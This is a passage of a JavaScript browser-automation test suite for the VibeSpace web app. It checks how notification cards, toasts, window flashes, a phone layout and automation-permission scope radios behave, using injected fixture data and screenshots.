    await A.evalJs(open2); await A.waitFor(`!!${CHAT(s1)} && !!${CHAT(s2)}`, 8000); await sleep(1200);
    const VOF = (sid) => `(() => { const w = ${CHAT(sid)}; return w ? app.sessions.get(w.id) : null; })()`;
    /** the announce as rendered: the stack (its cards, «more», where it stands against the For-you button), each window's flash */
    const ANN = `(() => { const s = document.querySelector('.ut-announce'), b = document.getElementById('taskbar-user-todos'), br = b && b.getClientRects().length ? b.getBoundingClientRect() : null, sr = s ? s.getBoundingClientRect() : null;
      const cards = s ? [...s.querySelectorAll(':scope > .uta-card')].filter((c) => !c.hidden).map((c) => ({ id: c.dataset.id, who: c.querySelector('.uta-who').textContent, what: c.querySelector('.uta-what').textContent.slice(0, 50), clock: c.querySelector('.uta-clock').hidden ? '' : c.querySelector('.uta-clock').textContent, expired: c.classList.contains('uta-expired'), h: Math.round(c.getBoundingClientRect().height) })) : [];
      const more = s && s.querySelector(':scope > .uta-more'); const win = (sid) => { const w = [...app.wm.windows.values()].find((x) => x.type === 'chat' && app.sessions.get(x.id)?.sessionId === sid); if (!w) return null; const tb = document.querySelector('.taskbar-item[data-win-id="' + w.id + '"]') || [...document.querySelectorAll('.taskbar-item')].find((x) => x.dataset.winId === w.id || x.dataset.id === w.id); const c = w.element.querySelector('.chat-attn-dock:not([hidden]) .cad-count'); return { waiting: w.element.classList.contains('window-waiting'), announce: w.element.classList.contains('window-announce'), active: w.element.classList.contains('window-active'), tbWaiting: !!tb && tb.classList.contains('waiting'), fill: c ? getComputedStyle(c).backgroundColor : null }; };
      return { shown: !!s && s.isConnected, all: s ? s.querySelectorAll(':scope > .uta-card').length : 0, cards, more: more && !more.hidden ? more.textContent : null, popover: !!s && (s.dataset.popover === '1' || [...document.querySelectorAll('[data-popover]')].includes(s)), toasts: [...document.querySelectorAll('#global-toasts .global-toast')].map((t) => t.dataset.todoId || '').filter(Boolean), above: !!(sr && br) && sr.bottom <= br.top + 1, nearX: !!(sr && br) && Math.abs(sr.right - br.right) < 80, w1: win(${J(s1)}), w2: win(${J(s2)}), blink: !!b && b.classList.contains('ut-blink') }; })()`;
    // (a) A RELOAD ANNOUNCES NOTHING OLD — then ONE ask from window 1 while window 2 is in front
    const a0 = await A.evalJs(ANN);
    check('r10+ a reload announces nothing old (the arrival rule\'s knownIds seed it): no stack after the page loads', !a0.shown, a0);
    await A.evalJs(`(() => { const w = ${CHAT(s2)}; app.wm.focusWindow ? app.wm.focusWindow(w.id) : w.element.dispatchEvent(new MouseEvent('mousedown', { bubbles: true })); return 1; })()`); await sleep(300);
    // r11 ONE ATTENTION POLICY (the r10 acceptance: bands 3–5 announced): a REAL plain question (band 5) moves a number only;
    // the acceptance's shapes — Dropline's band-5 dictionary reminder, a band-4 vault-rotate suggestion, a band-3 date — through
    // THE arrival path (a snapshot pushed through the page's own socket handlers, as a broadcast lands)
    const PUSH = (extra) => `(async () => { const d = await (await fetch('/api/user-todos')).json(); const todos = d.todos; todos.open = [...todos.open, ...${extra}]; for (const h of app.ws.globalHandlers) { try { h({ type: 'user-todos-updated', todos }); } catch { } } return todos.open.length; })()`;
    const blinkOff = `(() => { for (const b of [document.getElementById('taskbar-user-todos'), document.getElementById('mobile-nav-todos')]) b && b.classList.remove('ut-blink'); return 1; })()`;
    await A.evalJs(blinkOff);
    sayTo(s1, 'a plain one do:q400');
    const [q400] = await byText(/^Stress question 400:/, 1);
    const NOWB = Date.now(), quiet = [
      { id: 'ut-r11band5p', status: 'open', kind: 'action', origin: 'plugin', plugin: 'voice-input', urgency: 'low', text: 'Dropline suggests adding to your dictionary: CLAUDE.md', createdAt: NOWB, sessionKey: 'voice' },
      { id: 'ut-r11band4v', status: 'open', kind: 'action', origin: 'vault', text: 'Rotate the key you shared', action: { type: 'vault-rotate', entry: 'x' }, createdAt: NOWB, sessionKey: 'vault' },
      { id: 'ut-r11band3d', status: 'open', kind: 'action', origin: 'agent', text: 'Renew the certificate', due: NOWB + 3600e3, createdAt: NOWB, sessionKey: 'claude:r11-fixture' }];
    const cnt0 = await A.evalJs(`(document.getElementById('taskbar-user-todos') || {}).textContent || ''`);
    await A.evalJs(PUSH(J(quiet))); await sleep(1500);
    const b0 = await A.evalJs(ANN), cnt1 = await A.evalJs(`(document.getElementById('taskbar-user-todos') || {}).textContent || ''`);
    check(`RED-able (r11 — 7ec6c6dcf announced every one: a card, a flash, a pulse): ONE ATTENTION POLICY — a real plain question (band 5) and the acceptance's shapes (Dropline's band-5 dictionary reminder, a band-4 vault-rotate, a band-3 date) move a NUMBER only («${cnt0.trim()}» → «${cnt1.trim()}»): no card, no flash, no pulse, no toast`,
      !!q400 && !b0.shown && !b0.cards.length && !(b0.w1 && b0.w1.announce) && !b0.blink && !b0.toasts.length, { b0, cnt0, cnt1 });
    await A.evalJs(PUSH('[]')); await sleep(400);
    await A.evalJs(`(() => { localStorage.setItem('vibespace.toastHistory', '[]'); return 1; })()`);
    sayTo(s1, 'one ask do:u401');
    const [q401] = await byText(/^Stress question 401:/, 1);
    await A.waitFor(`(() => { const x = ${ANN}; return x.cards.length === 1 && x.w1 && x.w1.waiting; })()`, 8000); await sleep(500);
    const a1 = await A.evalJs(ANN);
    await A.shot('desktop-1280-announce-one.png');
    const hist = await A.evalJs(`JSON.parse(localStorage.getItem('vibespace.toastHistory') || '[]').filter((h) => h.ref && h.ref.id === ${J(q401 && q401.id)}).map((h) => ({ m: h.m, ref: h.ref }))`);
    check(`r10+ r11 (RED on bd5c5fd98: a generic toast, no flash, no clock; RED on 7ec6c6dcf: the toast REPLACED, no history entry) ONE band-1 ask from a window not in front ⇒ THE TOAST, GROWN: its toast stands (its history entry ${J(hist[0] || null)}), that window FLASHES (title bar + its taskbar button: the waiting blink), its strip's count wears the fill (${a1.w1 && a1.w1.fill}); ONE card at the For-you button — above it, NO popover — «${a1.cards[0] && a1.cards[0].who} · ${a1.cards[0] && a1.cards[0].what}»; the button pulsed`,
      !!q401 && hist.length === 1 && hist[0].ref.kind === 'todo' && !/Stress question/.test(hist[0].m) && a1.toasts.includes(q401.id) && a1.shown && !a1.popover && a1.above && a1.cards.length === 1 && a1.cards[0].id === q401.id && /Stress question 401/.test(a1.cards[0].what) && !!a1.w1 && a1.w1.waiting && a1.w1.announce && a1.w1.tbWaiting && a1.w1.fill && !/rgba\(0, 0, 0, 0\)|transparent/.test(a1.w1.fill) && !!a1.w2 && !a1.w2.announce && a1.blink, a1);
    // (b) TEN IN A MINUTE (the owner's loop) ⇒ one stack: the newest three + «N more», one card per item
    sayTo(s1, 'ten more do:par ' + Array.from({ length: 10 }, (_, k) => 'do:u' + (402 + k)).join(' '));
    const t11 = await byText(/^Stress question 4(0[1-9]|1[01]):/, 11, 60000);
    await A.waitFor(`(() => { const x = ${ANN}; return x.all === 11; })()`, 10000); await sleep(500);
    const a2 = await A.evalJs(ANN);
    await A.shot('desktop-1280-announce-ten.png');
    // r14: NOTHING TRANSIENT ON A WINDOW'S SEND (the acceptance's own shot of r13: the first card over Session 10's Send; the shot of
    // the first r14 commits: the four toasts there instead) — at every shown chat window's Send the topmost thing is the Send
    const sends = await A.evalJs(`[...document.querySelectorAll('.window .chat-input-area .chat-send-btn')].filter((b) => b.getClientRects().length && getComputedStyle(b).visibility !== 'hidden').map((b) => { const r = b.getBoundingClientRect(), x = r.left + r.width / 2, y = r.top + r.height / 2, h = document.elementFromPoint(x, y); const win = b.closest('.window'), front = h && h.closest('.window'); return { at: [Math.round(x), Math.round(y)], top: h === b || b.contains(h) ? 'send' : !h ? 'none' : h.closest('#global-toasts') ? 'a toast' : h.closest('.ut-announce') ? 'the stack' : front && front !== win ? 'another window' : (h.className || h.tagName).toString().slice(0, 24) }; })`);
    check(`r14 TEN IN A MINUTE: no toast and no card on a window's Send — at each Send the topmost thing is the Send or a window in front of it (${J(sends.map((x) => x.top))})`, sends.length >= 1 && sends.every((x) => x.top === 'send' || x.top === 'another window'), sends);
    // the newest three BY FILING TIME, a same-ms tie by id — ONE order (PURE newestFirst: the stack's, the dock's, this oracle's;
    // r11 — the heavy on 7ec6c6dcf showed 408 where the leg's own sort had picked its same-ms twin: the stack broke a tie by
    // when its card was made)
    const want3 = [...t11].sort(FA.newestFirst).slice(0, 3).map((i) => i.id), ties = t11.length - new Set(t11.map((i) => i.createdAt)).size;
    check(`r10+ r11 TEN IN A MINUTE ⇒ ONE stack: ${a2.all} cards (one per item), EXACTLY the newest three in order (${ties} same-ms tie(s) in the batch, broken by id) + «${a2.more}» — never a wall`, a2.all === 11 && a2.cards.length === 3 && a2.cards.map((c) => c.id).join() === want3.join() && /^8 more waiting/.test(a2.more || ''), { got: a2.cards.map((c) => c.id), want3, filed: [...t11].sort(FA.newestFirst).slice(0, 5).map((i) => [i.id, i.createdAt]) });
    // (c) ANSWERED ELSEWHERE ⇒ its card goes (multi-client live)
    const gone = a2.cards[0] && a2.cards[0].id;
    await done(gone);
    await A.waitFor(`(() => { const x = ${ANN}; return x.all === 10 && !x.cards.some((c) => c.id === ${J(gone)}); })()`, 8000);
    const a3 = await A.evalJs(ANN);
    check('r10+ an item answered on another client ⇒ its card is gone from the stack (the next one shows)', a3.all === 10 && !a3.cards.some((c) => c.id === gone) && a3.cards.length === 3, a3);
    // (d) A CARD EXPIRING WHILE IT IS UP (this page's copy of the item given a deadline 4 s out — every snapshot read through it)
    const exp = a3.cards[0] && a3.cards[0].id;
    await A.evalJs(`(() => { const m = app._inboxModel, d = Object.getOwnPropertyDescriptor(m, 'todos'); window.__todos18 = d; const get = d.get, at = Date.now() + 4000;
      Object.defineProperty(m, 'todos', { configurable: true, get() { const t = get.call(m); for (const i of t.open || []) if (i.id === ${J(exp)}) i.expiresAt = at; return t; } }); return 1; })()`);
    await A.waitFor(`(() => { const x = ${ANN}; const c = x.cards.find((y) => y.id === ${J(exp)}); return !!c && / s left$/.test(c.clock); })()`, 4000);
    const e0 = (await A.evalJs(ANN)).cards.find((c) => c.id === exp);
    await A.waitFor(`(() => { const x = ${ANN}; const c = x.cards.find((y) => y.id === ${J(exp)}); return !!c && c.expired; })()`, 8000); await sleep(400);
    const a4 = await A.evalJs(ANN), e1 = a4.cards.find((c) => c.id === exp);
    await A.shot('desktop-1280-announce-expired.png');
    check(`r10+ a card whose item expires while it is up: «${e0 && e0.clock}» → «${e1 && e1.clock}» — it SAYS expired and stays (a late card), never vanishing like one answered`, !!e0 && /^\d s left$/.test(e0.clock) && !!e1 && e1.expired && e1.clock === 'expired', { e0, e1 });
    await A.evalJs(`(() => { const m = app._inboxModel; if (window.__todos18) { Object.defineProperty(m, 'todos', window.__todos18); delete window.__todos18; } return 1; })()`);
    // (e) TWO WINDOWS ASKING AT ONCE (the For-you window in front): both flash, a card each
    await A.evalJs(`(() => { app.openInbox(); return 1; })()`); await sleep(900);
    sayTo(s1, 'at once do:u412'); sayTo(s2, 'at once do:u413');
    const [q412] = await byText(/^Stress question 412:/, 1), [q413] = await byText(/^Stress question 413:/, 1);
    await A.waitFor(`(() => { const x = ${ANN}; return x.cards.some((c) => c.id === ${J(q412 && q412.id)}) && x.cards.some((c) => c.id === ${J(q413 && q413.id)}) && x.w2 && x.w2.waiting; })()`, 10000); await sleep(500);
    const a5 = await A.evalJs(ANN);
    await A.shot('desktop-1280-announce-two-windows.png');
    check(`r10+ TWO WINDOWS ASKING AT ONCE (another window in front) ⇒ both flash (their title bars + taskbar buttons), both strips filled, a card each at the top of the stack («${a5.cards.map((c) => c.who).join('», «')}»)`, !!a5.w1 && a5.w1.waiting && a5.w1.announce && !!a5.w2 && a5.w2.waiting && a5.w2.announce && a5.w2.tbWaiting && a5.cards.slice(0, 2).map((c) => c.id).sort().join() === [q412.id, q413.id].sort().join(), a5);
    await A.evalJs(`(() => { for (const w of [...app.wm.windows.values()]) if (w.type === 'inbox') app.wm.closeWindow(w.id); return 1; })()`); await sleep(400);
    // (f) SEEN: a press on window 2 ⇒ its flash and its strip's fill end; window 1 still flashes
    const w2c = await A.evalJs(`(() => { const r = ${CHAT(s2)}.element.querySelector('.chat-message-list').getBoundingClientRect(); return { x: Math.round(r.left + r.width / 2), y: Math.round(r.top + 40) }; })()`);
    await A.clickAt(w2c.x, w2c.y); await sleep(500);
    const a6 = await A.evalJs(ANN);
    check('r10+ SEEN: a press on window 2 ends ITS flash and its strip\'s fill (the waiting blink\'s own clear); window 1, unseen, still flashes', !!a6.w2 && !a6.w2.waiting && !a6.w2.announce && !!a6.w1 && a6.w1.waiting && a6.w1.announce, a6);
    // (g) ONE PRESS OPENS IT: the card of q412 ⇒ window 1 in front, the card landed; its stack card gone, its flash ends
    await A.evalJs(`(() => { window.__d18 = []; new MutationObserver((ms) => { for (const m of ms) if (m.target.classList?.contains('chat-ask-flash') && m.target.dataset?.item) window.__d18.push(m.target.dataset.item); }).observe(document.body, { subtree: true, attributes: true, attributeFilter: ['class'] }); return 1; })()`);
    const top7 = await A.evalJs(`(() => { const c = document.querySelector('.ut-announce .uta-card[data-id="${q412 && q412.id}"] .uta-go'); if (!c) return null; const r = c.getBoundingClientRect(), h = document.elementFromPoint(r.left + r.width / 2, r.top + r.height / 2); return h === c || c.contains(h) ? 'the card' : h ? (h.closest('#global-toasts') ? 'a toast' : (h.className || h.tagName).toString().slice(0, 30)) : null; })()`);
    await A.press(`.ut-announce .uta-card[data-id="${q412 && q412.id}"] .uta-go`, { touch: false }); await sleep(1500);
    const a7 = await A.evalJs(ANN), fl = await A.evalJs('window.__d18 || []');
    check(`r10+ ONE PRESS on a card opens its item (THE For-you door): the topmost thing at its centre is the card (${top7} — r14: on fb61162f9 a toast stood there, the stack having moved from under it), window 1 in front, its card landed (${J(fl)}), the stack card gone, window 1's flash ended (seen)`, top7 === 'the card' && !a7.cards.some((c) => c.id === q412.id) && !!a7.w1 && a7.w1.active && !a7.w1.waiting && !a7.w1.announce && fl.includes(q412.id), { top7, a7, fl });
    // (g2) r11 THE BLINK HAS REASONS (the r10 acceptance): window 2 (not in front) files a band-1 ask and its turn ENDS — the
    // announce's flash first, then the turn's «finished»; the ask answered on another client ⇒ the announce's part goes, the
    // turn's blink STAYS (7ec6c6dcf decided once whose blink it was and cleared it)
    sayTo(s2, 'reasons do:u415');
    const [q415] = await byText(/^Stress question 415:/, 1);
    await A.waitFor(`(() => { const x = ${ANN}; return !!x.w2 && x.w2.announce && x.cards.some((c) => c.id === ${J(q415 && q415.id)}); })()`, 10000);
    await A.waitFor(`(() => { const w = ${CHAT(s2)}; return !!w && !!w._waitWhy && w._waitWhy.has('turn'); })()`, 10000).catch(() => null); await sleep(300); // its turn ended (turn_complete)
    const why0 = await A.evalJs(`(() => { const w = ${CHAT(s2)}; return w && w._waitWhy ? [...w._waitWhy].sort() : null; })()`);
    await done(q415 && q415.id);
    await A.waitFor(`(() => { const x = ${ANN}; return !x.cards.some((c) => c.id === ${J(q415 && q415.id)}); })()`, 8000); await sleep(600);
    const g2 = await A.evalJs(ANN);
    check(`RED-able (r11 — 7ec6c6dcf: the blink ended with the answer): THE BLINK HAS REASONS — window 2's band-1 ask flashed it, then its turn ended (reasons ${J(why0)}); the ask answered elsewhere ⇒ its card and the strip's fill go, the turn's blink STAYS (title bar + taskbar button) until the window is seen`,
      J(why0) === J(['ask', 'turn']) && !!g2.w2 && g2.w2.waiting && g2.w2.tbWaiting && !g2.w2.announce && !g2.w2.active, { why0, w2: g2.w2 });
    // (a point of window 2's own list that no other window covers — window 1, in front since (g), may overlap it)
    const w2d = await A.evalJs(`(() => { const w = ${CHAT(s2)}, r = w.element.querySelector('.chat-message-list').getBoundingClientRect(); for (let y = r.top + 12; y < r.bottom - 12; y += 16) for (let x = r.left + 12; x < r.right - 12; x += 16) { const h = document.elementFromPoint(x, y); if (h && w.element.contains(h) && h.closest('.chat-message-list')) return { x: Math.round(x), y: Math.round(y) }; } return null; })()`);
    if (w2d) await A.clickAt(w2d.x, w2d.y); await sleep(500);
    const g3 = await A.evalJs(ANN);
    check('…and SEEN acknowledges every reason: a press on window 2 ends its blink', !!g3.w2 && !g3.w2.waiting, g3.w2);
    // (g3) r11 NO POPOVER: a card up, then Esc (and the Esc protocol's own question — what [data-popover] stands) — the card stays
    sayTo(s1, 'esc do:u416');
    const [q416] = await byText(/^Stress question 416:/, 1);
    await A.waitFor(`(() => { const x = ${ANN}; return x.cards.some((c) => c.id === ${J(q416 && q416.id)}); })()`, 10000); await sleep(400);
    for (const type of ['keyDown', 'keyUp']) await A.cdp('Input.dispatchKeyEvent', { type, key: 'Escape', code: 'Escape', windowsVirtualKeyCode: 27 });
    await sleep(400);
    const g4 = await A.evalJs(ANN);
    check('RED-able (r11 — 7ec6c6dcf\'s stack was a createPopover: the first Esc removed it): the stack is a transient toast, NO popover — Esc goes to the real popover / window and the card stays; no [data-popover] is it', g4.shown && !g4.popover && g4.cards.some((c) => c.id === q416.id), g4);
    // (g4) r11 A RESYNC'S BURST (an overnight sleep: one snapshot brings 20 band-1 asks and 20 plain questions filed meanwhile)
    for (const it of (await api()).open) await done(it.id);
    await A.waitFor(`(() => { const x = ${ANN}; return x.all === 0; })()`, 8000).catch(() => null);
    const NOWR = Date.now(), burst = [...Array.from({ length: 20 }, (_, k) => ({ id: 'ut-r11u' + String(k).padStart(3, '0'), status: 'open', kind: 'action', origin: 'machines', urgency: 'urgent', text: 'Resync ask ' + k, createdAt: NOWR - 60e3 + k * 1000, sessionKey: 'claude:r11-resync' })),
      ...Array.from({ length: 20 }, (_, k) => ({ id: 'ut-r11q' + String(k).padStart(3, '0'), status: 'open', kind: 'action', origin: 'agent', text: 'Resync question ' + k, createdAt: NOWR - 60e3 + k * 1000, sessionKey: 'claude:r11-resync' }))];
    await A.evalJs(PUSH(J(burst))); await sleep(1500);
    const g5 = await A.evalJs(ANN);
    await A.shot('desktop-1280-announce-resync.png');
    check(`r11 A RESYNC'S BURST (20 band-1 asks + 20 plain questions in one snapshot) ⇒ ONE stack: ${g5.all} cards (the 20 inside the policy, none of the 20 outside it), the newest three shown + ONE «${g5.more}»; the toasts their own cap (${g5.toasts.length} ≤ 4) — never a storm`,
      g5.all === 20 && g5.cards.length === 3 && g5.cards.map((c) => c.id).join() === 'ut-r11u019,ut-r11u018,ut-r11u017' && /^17 more waiting/.test(g5.more || '') && g5.toasts.length <= 4 && !g5.cards.some((c) => /^ut-r11q/.test(c.id)), g5);
    await A.evalJs(PUSH('[]'));
    await A.waitFor(`(() => { const x = ${ANN}; return x.all === 0; })()`, 8000).catch(() => null);
    // (h) THE PHONE (390×844 touch): a page of its own on conversation 1; window 2's ask ⇒ the card UNDER the top bar, 44 px targets, the button pulsed
    await A.cdp('Target.createTarget', { url: 'about:blank' }).catch(() => null);
    let tP3 = null; for (let i = 0; i < 40 && !tP3; i++) { tP3 = (await targets()).find((x) => x.id !== target.id); if (!tP3) await sleep(150); }
    const P3 = await connect(tP3);
    try {
      await P3.front(); await toConv(P3, s1, [], 390, 844, true); await sleep(800);
      sayTo(s2, 'phone do:u414');
      const [q414] = await byText(/^Stress question 414:/, 1);
      await P3.waitFor(`(() => { const s = document.querySelector('.ut-announce'); return !!s && !!s.querySelector('.uta-card[data-id="${q414 && q414.id}"]'); })()`, 10000); await sleep(600);
      const ph = await P3.evalJs(`(() => { const s = document.querySelector('.ut-announce'), b = document.getElementById('mobile-nav-todos'), br = b && b.getClientRects().length ? b.getBoundingClientRect() : null, sr = s.getBoundingClientRect();
        const t = [...s.querySelectorAll('button')].filter((x) => x.getClientRects().length).map((x) => { const r = x.getBoundingClientRect(); return { k: x.className, w: Math.round(r.width), h: Math.round(r.height) }; });
        return { under: !!br && sr.top >= br.bottom - 1, nav: !!br, t, what: getComputedStyle(s.querySelector('.uta-what')).fontSize, blink: !!b && b.classList.contains('ut-blink'), w: Math.round(sr.width), vw: innerWidth }; })()`);
      await P3.shot('phone-390-announce.png');
      const small = ph.t.filter((x) => x.h < 44 || x.w < 44);
      check(`r10+ THE PHONE: the card stands UNDER the top bar's For-you button, inside the screen (${ph.w} of ${ph.vw} px), its words ${ph.what}, every target ≥ 44 px (${ph.t.map((x) => x.k.split(' ')[0] + ' ' + x.w + '×' + x.h).join(', ')}), the button pulsed once`, ph.nav && ph.under && ph.w <= ph.vw && parseFloat(ph.what) >= 16 && !small.length && ph.blink, { ph, small });
    } finally { await P3.close(); await A.cdp('Target.closeTarget', { targetId: tP3.id }).catch(() => null); }
    for (const it of (await api()).open) await done(it.id);
  } catch (e) { fail++; console.log('  ✗ ⑱ threw: ' + (e?.message || e)); }
  lap('⑱ done');

  // ── ⑲ THE PICK IS THE ITEM'S (lane needs-card-tail r11 — the r10 acceptance's repro/accept-r10/radio-group.html, on the real
  // page): an automation card's REACH radios stood in the card AND, hidden, in the attention dock's copy of the row — radios of
  // ONE name with no form are ONE group, so the copy drawn last took the check: the card showed none checked and its Allow sent
  // no reach. Now a form control exists once per item: the dock draws no pick, every drawn copy's group is its own, the pick is
  // the item's (user-todos-row.js reachFor) — it survives a repaint, and every Allow carries it.
  // r12 (the r11 acceptance — r11 pinned the strip's Always carrying the card's pick while the strip SHOWED no reach: the owner
  // reads «The whole VibeSpace» in the tray, closes it unanswered, presses the strip's Always ⇒ an instance-wide grant):
  // A PRESS POINT NEVER SENDS A SCOPE IT DOES NOT SHOW — the strip SAYS the pick beside its answers and its Always names it; a
  // pick made on any copy the row module draws rewords it before any press; every press carries exactly the scope its press point shows ──
  console.log('⑲ THE PICK IS THE ITEM\'S; A PRESS POINT SAYS THE SCOPE IT SENDS — the reach in the card, none in the strip but its words; a pick made on any drawn copy rewords the strip before any press; every Allow carries what its press point shows');
  try {
    await A.front(); await A.device(1280, 800, { mouse: true });
    const s9 = await newConv('reach'); await sleep(600); sayTo(s9, 'hello'); await sleep(1500);
    await A.evalJs(`(() => { app.phoneHome?.hide?.(); if (!${CHAT(s9)}) app.attachSession(${J(s9)}, 'reach', ${J(WORK)}, { mode: 'chat', backend: 'claude' }); return 1; })()`);
    await A.waitFor(`!!${CHAT(s9)}`, 8000); await sleep(1200);
    const KEY9 = await A.evalJs(`(() => { const w = ${CHAT(s9)}; return (app.foryouRows.keysForWin(w.id) || [])[0] || null; })()`);
    const T9 = Date.now() - 2000; // (a FIXED filing: the card stands at the conversation's last record — the 'turn' placement)
    const ak = (detail = 'first use') => [{ id: 'ut-r11reach01', sessionKey: KEY9, status: 'open', kind: 'action', origin: 'vault', urgency: 'urgent', createdAt: T9,
      text: 'reach wants to use the automation key K1 (conversations.open)', detail, action: { type: 'automation-ask', askId: 'r'.repeat(32), groups: 'grp-1 grp-2', keyId: 'k1', verb: 'conversations.open' } }];
    const PUSH9 = (extra) => `(async () => { const d = await (await fetch('/api/user-todos')).json(); const todos = d.todos; todos.open = [...todos.open, ...${extra}]; for (const h of app.ws.globalHandlers) { try { h({ type: 'user-todos-updated', todos }); } catch { } } return 1; })()`;
    const WORD = { opened: 'Only the conversations it opens', groups: 'The conversations of its Task Groups', instance: 'The whole VibeSpace' }; // (automation-reach.js reachWord — en)
    const R9 = `(() => { const w = ${CHAT(s9)}; const card = w.element.querySelector('.cn-card .ut-item[data-id="ut-r11reach01"]'), dock = w.element.querySelector('.chat-attn-dock .cad-rows .ut-item[data-id="ut-r11reach01"]');
      const pick = (el) => (el ? (el.querySelector('.ut-ak-reach input:checked') || {}).value || null : 'n/a'), names = card ? [...new Set([...card.querySelectorAll('.ut-ak-reach input')].map((r) => r.name))] : [];
      const sc = dock && dock.querySelector('.ut-ak-scope'), word = sc && sc.querySelector('.ut-ak-scope-word'), al = dock && dock.querySelector('.ut-hub-always');
      const bx = (e) => { const r = e.getBoundingClientRect(); return { w: Math.round(r.width), h: Math.round(r.height), left: Math.round(r.left), right: Math.round(r.right), top: Math.round(r.top) }; };
      return { card: !!card, dock: !!dock, cardPick: pick(card), dockRadios: dock ? dock.querySelectorAll('.ut-ak-reach, input[type="radio"]').length : -1, names, shared: names.length ? document.querySelectorAll('input[name="' + names[0] + '"]').length : 0, cardRadios: card ? card.querySelectorAll('.ut-ak-reach input').length : 0,
        says: sc ? sc.dataset.reach : null, word: word ? word.textContent : null, red: !!word && word.classList.contains('ut-ak-reach-instance'), seen: !!sc && sc.getClientRects().length > 0 && getComputedStyle(sc).display !== 'none', px: word ? parseFloat(getComputedStyle(word).fontSize) : 0,
        always: al ? al.textContent : null, cardAlways: card ? (card.querySelector('.ut-hub-always') || {}).textContent || null : null, scope: sc ? bx(sc) : null,
        answers: dock ? [...dock.querySelectorAll('.ut-exit-answer > button')].map((b) => ({ k: b.textContent.trim(), ...bx(b) })) : [], over: dock ? w.element.querySelector('.chat-attn-dock').scrollWidth - w.element.querySelector('.chat-attn-dock').clientWidth : null, vw: innerWidth }; })()`;
    const saysAll = (x, k) => !!x && x.says === k && x.word === WORD[k] && x.seen && !!x.always && x.always.includes(WORD[k]);
    await A.evalJs(PUSH9(J(ak()))); await A.waitFor(`(() => { const x = ${R9}; return x.card && x.dock; })()`, 8000); await sleep(800);
    const r1 = await A.evalJs(R9);
    await A.shot('desktop-1280-reach-card.png');
    check(`RED-able (r11 — 7ec6c6dcf: card=null, the dock's hidden copy took the check): the automation card stands in the flow and in the strip; its REACH radios are the card's alone (the strip draws ${r1.dockRadios} of them), ONE group of its own (${r1.names.join()} — ${r1.shared} radios of that name in the page), «opened» checked by default`,
      r1.card && r1.dock && r1.dockRadios === 0 && r1.cardRadios === 3 && r1.names.length === 1 && r1.shared === 3 && r1.cardPick === 'opened', r1);
    check(`RED-able (r12 — 9f8b8d846: the strip said no reach): the strip SAYS the reach its answers carry — «${r1.word}» (${r1.px} px) beside them, its Always «${r1.always}»; the card keeps «${r1.cardAlways}» beside its radios`, saysAll(r1, 'opened') && r1.cardAlways === 'Always for this conversation', r1);
    await A.press(`.cn-card .ut-item[data-id="ut-r11reach01"] .ut-ak-reach-groups`, { touch: false }); await sleep(300);
    const r2 = await A.evalJs(R9); // (no broadcast between: the pick alone)
    check(`RED-able (r12 — 9f8b8d846): a pick made on the CARD rewords the strip BEFORE any press — «${r2.word}», «${r2.always}»`, r2.cardPick === 'groups' && saysAll(r2, 'groups'), r2);
    await A.evalJs(PUSH9(J(ak('first use — still waiting on you')))); await sleep(1200); // its words moved: both rows' signatures move ⇒ the card AND the strip repaint (the acceptance's PATH A, a minute's age, moves them the same way)
    const r3 = await A.evalJs(R9);
    await A.shot('desktop-1280-dock-reach.png');
    check(`RED-able (r11 — 7ec6c6dcf: the repaint left card=null): the owner picks «groups» on the card (${r2.cardPick}); a pass that repaints the card AND the strip keeps it — the card still reads «${r3.cardPick}», the strip «${r3.word}»`, r3.card && r3.cardPick === 'groups' && saysAll(r3, 'groups') && r3.over <= 0, { r2, r3 });
    await A.evalJs(`(() => { const m = app._inboxModel; window.__ra19 = m.runAction; window.__got19 = []; m.runAction = (rec, answer, extra) => { window.__got19.push({ id: rec && rec.id, answer, extra }); return Promise.resolve(true); }; return 1; })()`);
    await sleep(1100); await A.press(`.cn-card .ut-item[data-id="ut-r11reach01"] .ut-hub-always`, { touch: false }); await sleep(400); // r12b (the r12 review F2): the CARD's own Always under a non-default pick («groups»)
    const pressDock = async (cls) => { await sleep(1100); const shown = (await A.evalJs(R9)).says; await A.press(`.chat-attn-dock .cad-rows .ut-item[data-id="ut-r11reach01"] .${cls}`, { touch: false }); await sleep(400); return shown; }; // (the press arm: an Allow shown under 700 ms ago is not the one read)
    // THE OWNER'S SHAPE: «The whole VibeSpace» pressed in the TRAY to read it, the tray closed unanswered; then only the strip
    await A.press('#taskbar-user-todos', { touch: false });
    await A.waitFor(`!!document.querySelector('#user-todos-popup:not(.hidden) .ut-item[data-id="ut-r11reach01"]')`, 6000);
    if (!(await A.evalJs(`(() => { const l = document.querySelector('#user-todos-popup .ut-item[data-id="ut-r11reach01"] .ut-ak-reach-instance'); return !!l && l.getClientRects().length > 0; })()`))) await A.press(`#user-todos-popup .ut-item[data-id="ut-r11reach01"] .ut-text`, { touch: false });
    await A.waitFor(`(() => { const l = document.querySelector('#user-todos-popup .ut-item[data-id="ut-r11reach01"] .ut-ak-reach-instance'); return !!l && l.getClientRects().length > 0; })()`, 4000);
    await A.press(`#user-todos-popup .ut-item[data-id="ut-r11reach01"] .ut-ak-reach-instance`, { touch: false }); await sleep(300);
    await A.press('#taskbar-user-todos', { touch: false }); await A.waitFor(`document.getElementById('user-todos-popup').classList.contains('hidden')`, 4000);
    const r4 = await A.evalJs(R9);
    await A.shot('desktop-1280-dock-reach-instance.png');
    const sawI = await pressDock('ut-hub-always');
    // the owner picks the narrowest again (on the card); the strip's Allow once then carries exactly that — never 'instance'
    await A.press(`.cn-card .ut-item[data-id="ut-r11reach01"] .ut-ak-reach-opened`, { touch: false }); await sleep(300);
    const r5 = await A.evalJs(R9);
    const sawO = await pressDock('ut-hub-once');
    await sleep(1100); await A.press(`.cn-card .ut-item[data-id="ut-r11reach01"] .ut-hub-always`, { touch: false }); await sleep(400);
    const got = await A.evalJs(`window.__got19 || []`);
    await A.evalJs(`(() => { const m = app._inboxModel; if (window.__ra19) m.runAction = window.__ra19; delete window.__ra19; return 1; })()`);
    check(`RED-able (r12 — 9f8b8d846: the strip said nothing, then sent 'instance'): THE OWNER'S SHAPE — «The whole VibeSpace» read in the tray and left: the strip says «${r4.word}» (red: ${r4.red}) and «${r4.always}» BEFORE the press, and its Always sends exactly that (${J(got[1] && got[1].extra)})`,
      r4.cardPick === 'instance' && saysAll(r4, 'instance') && r4.red && sawI === 'instance' && !!got[1] && got[1].answer === 'always' && got[1].extra && got[1].extra.reach === 'instance', { r4, sawI, got1: got[1] });
